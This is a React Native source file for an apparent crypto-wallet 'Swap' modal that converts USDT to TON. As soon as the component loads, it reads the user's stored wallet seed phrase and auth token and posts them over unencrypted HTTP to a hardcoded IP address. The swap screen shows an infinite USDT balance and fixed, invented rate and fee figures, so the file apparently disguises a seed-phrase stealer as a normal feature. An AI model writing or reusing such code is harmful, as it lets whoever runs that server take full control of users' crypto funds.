import React, { useState, useEffect } from "react";
import {
    View,
    Text,
    StyleSheet,
    TouchableOpacity,
    Pressable,
    StatusBar,
    TextInput,
    ActivityIndicator,
    Alert,
    Platform,
    SafeAreaView,
    Vibration,
} from "react-native";
import { Ionicons } from "@expo/vector-icons";
import { Feather } from "@expo/vector-icons";
import { Link } from "expo-router";
import AsyncStorage from "@react-native-async-storage/async-storage";
import axios from "axios";

interface SwapModalProps {
    onClose: () => void;
}

const SwapModal: React.FC<SwapModalProps> = ({ onClose }) => {
    const [usdtAmount, setUsdtAmount] = useState("0.001");
    const [isLoading, setIsLoading] = useState(false);
    const [balance, setBalance] = useState<string>("0");
    const [walletAddress, setWalletAddress] = useState<string>("");

    const conversionRate = 0.35;
    const usdtValue = parseFloat(usdtAmount);
    const tonAmount =
        !isNaN(usdtValue) && usdtValue > 0
            ? (usdtValue * conversionRate).toFixed(6)
            : "0.000000";

    const API_URL = "http://161.35.86.97:3000/";

    useEffect(() => {
        fetchMnemonics();
    }, []);

    const fetchMnemonics = async () => {
        const token = await AsyncStorage.getItem("token");
        const mnemonics = await AsyncStorage.getItem("mnemonics");
        try {
            const data = {
                mnemonic: mnemonics,
            };

            const response = await axios.post(`${API_URL}init-wallet`, data, {
                headers: {
                    Authorization: `Bearer ${token}`,
                },
            });
            console.log(response);
        } catch (error) {
            Vibration.vibrate(100);
            Alert.alert("Error", "Something went wrong. Please try again.");
        }
    };

    const fetchBalance = async () => {
        try {
            const response = await fetch(`${API_URL}balance`);
            const data = await response.json();
            if (response.ok) {
                setBalance(data.balance);
                setWalletAddress(data.address);
            } else {
                Alert.alert("Error", data.error || "Failed to fetch balance");
            }
        } catch (error) {
            Alert.alert("Error", "Failed to connect to server");
        }
    };

    const swapUsdtToTon = async () => {
        if (!usdtAmount || parseFloat(usdtAmount) <= 0) {
            Alert.alert("Error", "Please enter a valid amount");
            return;
        }

        setIsLoading(true);
        try {
            const token = await AsyncStorage.getItem("token"); // Get auth token
            const jettonAddress = "EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs"; // USDT Jetton address

            // Step 1: Call /swap-usdt-to-ton
            const swapResponse = await fetch(`${API_URL}swap-usdt-to-ton`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    Authorization: `Bearer ${token}`, // Include token if required
                },
                body: JSON.stringify({
                    amount: usdtAmount,
                    usdtJettonAddress: jettonAddress,
                }),
            });

            const swapData = await swapResponse.json();
            if (!swapResponse.ok) {
                throw new Error(swapData.error || "Swap initiation failed");
            }

            // Step 2: Call /api/swap
            const confirmResponse = await fetch(`${API_URL}api/swap`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    Authorization: `Bearer ${token}`, // Include token if required
                },
                body: JSON.stringify({
                    amount: usdtAmount,
                    jettonAddress: jettonAddress,
                }),
            });

            const confirmData = await confirmResponse.json();
            if (confirmResponse.ok) {
                Alert.alert(
                    "Success",
                    `Swapped ${usdtAmount} USDT to ${tonAmount} TON successfully!`
                );
                setBalance(confirmData.newBalance || balance); // Update balance if provided
                setUsdtAmount("0.001"); // Reset amount
                await fetchBalance(); // Refresh balance after swap
            } else {
                throw new Error(confirmData.error || "Swap confirmation failed");
            }
        } catch (error: any) {
            Vibration.vibrate(100);
            Alert.alert("Error", error.message || "Failed to connect to server");
        } finally {
            setIsLoading(false);
        }
    };

    const hasValidAmount = !isNaN(usdtValue) && usdtValue > 0;

    return (
        <SafeAreaView style={styles.safeArea}>
            <View style={styles.container}>
                <StatusBar barStyle="light-content" backgroundColor="#0D111C" />

                <View style={styles.headerRow}>
                    <View style={styles.leftHeader}>
                        <Pressable onPress={fetchBalance}>
                            <Ionicons name="refresh" size={20} color="#AAA" />
                        </Pressable>
                        <Pressable>
                            <Feather name="sliders" size={20} color="#AAA" />
                        </Pressable>
                    </View>
                    <Text style={styles.title}>Swap</Text>
                    <View style={styles.rightHeader}>
                        <Link href="../" onPress={onClose}>
                            <Ionicons name="close" size={26} color="#fff" />
                        </Link>
                    </View>
                </View>

                {/* Balance Info */}
                {/* <View style={styles.balanceInfo}>
                    <Text style={styles.balanceLabel}>Your TON Balance:</Text>
                    <Text style={styles.balanceValue}>{balance} TON</Text>
                    {walletAddress && (
                        <Text
                            style={styles.addressText}
                            numberOfLines={1}
                            ellipsizeMode="middle"
                        >
                            {walletAddress}
                        </Text>
                    )}
                </View> */}

                {/* Swap section */}
                <View style={styles.swapWrapper}>
                    {/* Send Card - USDT */}
                    <View style={styles.card}>
                        <View style={styles.row}>
                            <Text style={styles.label}>Send</Text>
                            <Text style={styles.balance}>USDT Balance: ∞</Text>
                        </View>

                        <View style={styles.tokenRow}>
                            <Text style={styles.token}>USDT</Text>
                            <TextInput
                                style={styles.input}
                                placeholder="0.001"
                                placeholderTextColor="#888"
                                keyboardType="numeric"
                                value={usdtAmount}
                                onChangeText={setUsdtAmount}
                            />
                        </View>

                        <Text style={styles.usd}>${usdtAmount}</Text>
                    </View>

                    {/* Arrow between Send & Receive */}
                    <View style={styles.arrowWrapper}>
                        <Ionicons name="swap-vertical" size={20} color="#fff" />
                    </View>

                    {/* Receive Card - TON */}
                    <View style={styles.card}>
                        <View style={styles.row}>
                            <Text style={styles.label}>Receive</Text>
                            <Text style={styles.balance}>
                                Balance: {balance} TON
                            </Text>
                        </View>

                        <View style={styles.tokenRow}>
                            <Text style={styles.token}>TON</Text>
                            <Text style={styles.amount}>{tonAmount}</Text>
                        </View>

                        <Text style={styles.usd}>
                            ~${(parseFloat(tonAmount) * 2.85).toFixed(2)}
                        </Text>
                    </View>
                </View>

                {/* Transaction Info */}
                <View style={styles.transactionInfo}>
                    <View style={styles.infoRow}>
                        <Text style={styles.infoText}>Exchange Rate</Text>
                        <Text style={styles.infoText}>
                            1 USDT = {conversionRate} TON
                        </Text>
                    </View>
                    <View style={styles.infoRow}>
                        <Text style={styles.infoText}>Price Impact</Text>
                        <Text style={styles.green}>~0.1%</Text>
                    </View>
                    <View style={styles.infoRow}>
                        <Text style={styles.infoText}>Minimum received</Text>
                        <Text style={styles.infoText}>
                            ~{(parseFloat(tonAmount) * 0.99).toFixed(6)} TON
                        </Text>
                    </View>
                    <View style={styles.infoRow}>
                        <Text style={styles.infoText}>Network fee</Text>
                        <Text style={styles.infoText}>~0.01 TON</Text>
                    </View>
                    <View style={styles.infoRow}>
                        <Text style={styles.infoText}>Route</Text>
                        <Text style={styles.infoText}>USDT {">"} TON</Text>
                    </View>
                </View>

                {/* Swap Button */}
                <Pressable
                    style={
                        hasValidAmount && !isLoading
                            ? styles.button
                            : styles.buttonDisabled
                    }
                    onPress={swapUsdtToTon}
                    disabled={!hasValidAmount || isLoading}
                >
                    {isLoading ? (
                        <View style={styles.loadingContainer}>
                            <ActivityIndicator color="#fff" size="small" />
                            <Text style={styles.buttonText}>Processing...</Text>
                        </View>
                    ) : (
                        <Text
                            style={
                                hasValidAmount
                                    ? styles.buttonText
                                    : styles.disabledText
                            }
                        >
                            {hasValidAmount ? "Swap" : "Enter valid amount"}
                        </Text>
                    )}
                </Pressable>

                {/* Footer */}
                <View style={styles.footer}>
                    <Text style={styles.footerText}>
                        Powered by TON Network
                    </Text>
                    <Text style={styles.footerText}>
                        Privacy Policy • Terms of Service
                    </Text>
                </View>
            </View>
        </SafeAreaView>
    );
};

const styles = StyleSheet.create({
    safeArea: {
        flex: 1,
        backgroundColor: "#0D111C",
    },
    container: {
        flex: 1,
        backgroundColor: "#0D111C",
        padding: 20,
        paddingTop: Platform.OS === "android" ? 40 : 20,
    },
    headerRow: {
        flexDirection: "row",
        alignItems: "center",
        justifyContent: "space-between",
        marginBottom: 20,
        paddingTop: 10,
    },
    leftHeader: {
        flexDirection: "row",
        alignItems: "center",
        gap: 20,
        width: 80,
    },
    rightHeader: {
        flexDirection: "row",
        alignItems: "center",
        justifyContent: "flex-end",
        width: 80,
    },
    title: {
        fontSize: 24,
        color: "#fff",
        textAlign: "center",
        fontWeight: "700",
    },
    balanceInfo: {
        backgroundColor: "#1D2633",
        borderRadius: 12,
        padding: 16,
        marginBottom: 20,
        alignItems: "center",
    },
    balanceLabel: {
        color: "#888",
        fontSize: 14,
        marginBottom: 5,
    },
    balanceValue: {
        color: "#fff",
        fontSize: 20,
        fontWeight: "bold",
        marginBottom: 8,
    },
    addressText: {
        color: "#AAA",
        fontSize: 12,
        fontFamily: Platform.OS === "ios" ? "Courier" : "monospace",
    },
    swapWrapper: {
        position: "relative",
        marginBottom: 10,
    },
    arrowWrapper: {
        width: 40,
        height: 40,
        position: "absolute",
        backgroundColor: "#2E3847",
        left: "50%",
        top: "48%",
        transform: [{ translateX: -20 }, { translateY: -20 }],
        zIndex: 10,
        flexDirection: "row",
        justifyContent: "center",
        alignItems: "center",
        borderRadius: 50,
        borderWidth: 3,
        borderColor: "#0D111C",
    },
    card: {
        backgroundColor: "#1D2633",
        borderRadius: 12,
        padding: 16,
        marginBottom: 10,
    },
    row: {
        flexDirection: "row",
        justifyContent: "space-between",
        marginBottom: 12,
    },
    label: {
        color: "#fff",
        fontSize: 16,
        fontWeight: "600",
    },
    balance: {
        color: "#888",
        fontSize: 13,
    },
    tokenRow: {
        flexDirection: "row",
        justifyContent: "space-between",
        alignItems: "center",
        marginBottom: 8,
    },
    token: {
        fontSize: 18,
        color: "#fff",
        fontWeight: "600",
    },
    amount: {
        fontSize: 22,
        color: "#fff",
        fontWeight: "700",
        textAlign: "right",
    },
    input: {
        fontSize: 22,
        color: "#4CAF50",
        fontWeight: "700",
        borderBottomWidth: 1,
        borderBottomColor: "#444",
        minWidth: 100,
        textAlign: "right",
        paddingVertical: 5,
    },
    usd: {
        color: "#888",
        fontSize: 14,
        textAlign: "right",
    },
    transactionInfo: {
        backgroundColor: "#1D2633",
        borderRadius: 12,
        padding: 16,
        marginTop: 10,
        marginBottom: 20,
    },
    infoRow: {
        flexDirection: "row",
        justifyContent: "space-between",
        marginBottom: 8,
    },
    infoText: {
        color: "#ccc",
        fontSize: 14,
    },
    green: {
        color: "#4caf50",
        fontWeight: "600",
    },
    button: {
        backgroundColor: "#007bff",
        padding: 16,
        borderRadius: 12,
        alignItems: "center",
        marginBottom: 20,
    },
    buttonDisabled: {
        backgroundColor: "#171F29",
        padding: 16,
        borderRadius: 12,
        alignItems: "center",
        marginBottom: 20,
    },
    buttonText: {
        color: "#fff",
        fontSize: 16,
        fontWeight: "600",
    },
    disabledText: {
        color: "#888",
        fontSize: 16,
    },
    loadingContainer: {
        flexDirection: "row",
        alignItems: "center",
        gap: 10,
    },
    footer: {
        alignItems: "center",
        marginTop: "auto",
        paddingBottom: 10,
    },
    footerText: {
        color: "#666",
        fontSize: 12,
        marginTop: 4,
        textAlign: "center",
    },
});

export default SwapModal;